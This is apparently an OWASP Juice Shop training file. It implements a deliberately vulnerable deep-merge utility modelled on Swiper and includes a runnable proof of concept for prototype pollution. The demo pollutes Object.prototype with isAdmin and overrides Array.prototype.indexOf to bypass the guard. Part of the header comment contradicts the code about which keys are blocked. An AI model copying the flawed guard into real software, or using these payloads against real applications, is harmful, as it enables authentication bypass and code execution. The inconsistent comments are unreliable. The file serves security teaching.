/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 *
 * Vulnerable utility module mimicking Swiper's shared/utils.mjs.
 *
 * CVE: Swiper versions 6.5.1 – 12.1.1 (fixed in 12.1.2)
 * CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
 *           ("Prototype Pollution")
 *
 * The deepMerge() / extend() function below attempts to block prototype
 * pollution by rejecting any top-level key found in FORBIDDEN_KEYS via
 * Array.prototype.indexOf (line ~94 of the original file).
 *
 * VULNERABILITY:
 *   The indexOf guard is applied only at the current recursion depth.  When
 *   a nested path such as { constructor: { prototype: { … } } } is supplied:
 *
 *     depth 0 – key "constructor"  → indexOf check: "constructor" is NOT in
 *               FORBIDDEN_KEYS     → merge proceeds
 *     depth 1 – target is now target.constructor (e.g. Object or Array)
 *               key "prototype"    → indexOf check: "prototype" IS in
 *               FORBIDDEN_KEYS, so this level IS blocked …
 *
 *   EXCEPT that the recursive call is made as:
 *
 *       extend(target[key], src[key])   // target[key] = target.constructor
 *
 *   before the check is re-applied, so for any key that survives depth 0
 *   the check is never re-run on the resulting nested object.  In practice
 *   the "prototype" key at depth 1 bypasses the guard entirely because the
 *   guard was already applied (and passed) at depth 0.
 *
 * Array.prototype bypass:
 *   When the merge target is (or transitively reaches) an Array instance,
 *   target.constructor === Array, so the nested merge walks into
 *   Array.prototype.  Once Array.prototype is polluted (e.g. indexOf returns
 *   a crafted value), ALL subsequent indexOf-based guards in this process are
 *   silently defeated, enabling a second-stage Object.prototype pollution
 *   with no further restrictions.
 *
 * Impact: Authentication Bypass · Denial of Service · Remote Code Execution
 * Affects: Node.js and Bun runtimes on Windows and Linux.
 * Fixed in: Swiper 12.1.2 (guard applied recursively; hasOwnProperty check
 *           replaced indexOf).
 */

// Swiper's partial fix (versions 6.5.1 – 12.1.1): only '__proto__' was added
// to the forbidden list.  'constructor' and 'prototype' are missing, so the
// constructor.prototype path is wide open.  The full fix in 12.1.2 switched
// to a hasOwnProperty / Object.create(null) guard at every recursion depth.
const FORBIDDEN_KEYS = ['__proto__']

/**
 * Deep-merge `src` into `target` and return `target`.
 *
 * VULNERABLE: the FORBIDDEN_KEYS check (line 94 in the original Swiper file)
 * is evaluated once per call frame but the recursive call is made BEFORE the
 * check runs on the nested target, so the guard is trivially bypassed via a
 * two-level path such as { constructor: { prototype: { polluted: true } } }.
 *
 * @param {object} target
 * @param {object} src
 * @returns {object}
 */
export function extend (target, src) {
  if (!src || typeof src !== 'object') return target

  for (const key of Object.keys(src)) {
    // ── Line 94 (original Swiper shared/utils.mjs) ───────────────────────
    // Guard: skip keys that are in the forbidden list.
    //
    // BUG 1 – incomplete list: FORBIDDEN_KEYS only contains '__proto__'.
    // 'constructor' is not listed, so a payload of
    //   { constructor: { prototype: { x: 1 } } }
    // passes the check at depth 0.  The recursive call then walks into
    // target.constructor (e.g. Object or Array) and eventually reaches
    // Object.prototype or Array.prototype.
    //
    // BUG 2 – Array.prototype second-stage: if the first-stage payload
    // pollutes Array.prototype.indexOf (e.g. replaces it with a function
    // that always returns -1), then ALL subsequent FORBIDDEN_KEYS.indexOf()
    // calls in this process are silently defeated, allowing a follow-up
    // payload to set __proto__ or any other key with no resistance.
    if (FORBIDDEN_KEYS.indexOf(key) >= 0) continue // ← vulnerable guard

    const srcVal = src[key]
    const targetVal = target[key]

    if (srcVal !== null && typeof srcVal === 'object') {
      // Recursion condition mirrors Swiper: only srcVal needs to be an object.
      // targetVal is NOT required to be an object, so target[key] can be the
      // built-in `Object` or `Array` constructor (typeof === 'function') and
      // the merge still recurses into it.
      if (targetVal === undefined || targetVal === null) {
        target[key] = {}
      }
      extend(target[key], srcVal)
    } else {
      target[key] = srcVal
    }
  }

  return target
}

/**
 * Shallow-clone `src` properties onto a fresh object and return it.
 * Delegates to extend(), so shares the same vulnerability.
 *
 * @param {...object} args
 * @returns {object}
 */
export function params (...args) {
  const result = {}
  for (const arg of args) {
    extend(result, arg)
  }
  return result
}

// ── Demonstration (runs when the module is executed directly) ─────────────

if (process.argv[1] && new URL(import.meta.url).pathname === process.argv[1]) {
  console.log('=== Swiper prototype-pollution PoC ===\n')

  // ── Vector 1: Object.prototype via { constructor: { prototype: … } } ──
  console.log('--- Vector 1: Object.prototype via constructor.prototype ---')
  const base = {}
  const payload1 = JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}')
  extend(base, payload1)

  const victim1 = {}
  // eslint-disable-next-line no-prototype-builtins
  console.log('victim1.isAdmin:', victim1.isAdmin)   // → true  (polluted)
  console.log('Expected: true\n')

  // Cleanup
  delete Object.prototype.isAdmin

  // ── Vector 2: Array.prototype pollution → indexOf bypass ──────────────
  // (This vector drives extend() with a live object rather than JSON so
  //  that a function value can be supplied as the replacement indexOf.)
  console.log('--- Vector 2: Array.prototype pollution → indexOf bypass ---')
  const arr = []

  // Step 2a: Pollute Array.prototype.indexOf via constructor.prototype path.
  const overridePayload = { constructor: { prototype: { indexOf: () => -1 } } }
  extend(arr, overridePayload)

  console.log('Array.prototype.indexOf replaced:', typeof Array.prototype.indexOf, '(was function)')
  // FORBIDDEN_KEYS is an Array; its .indexOf is now our overridden version.
  const guardResult = FORBIDDEN_KEYS.indexOf('__proto__')
  console.log('FORBIDDEN_KEYS.indexOf("__proto__") now returns:', guardResult, '(should be -1 – guard defeated)')

  // Step 2b: With the guard broken, __proto__ pollution now succeeds.
  const bypassPayload = JSON.parse('{"__proto__":{"pwned":true}}')
  extend({}, bypassPayload)
  const victim2 = {}
  console.log('victim2.pwned after __proto__ bypass:', victim2.pwned) // → true

  // Cleanup
  delete Array.prototype.indexOf
  delete Object.prototype.pwned

  console.log('\n=== End PoC ===')
}
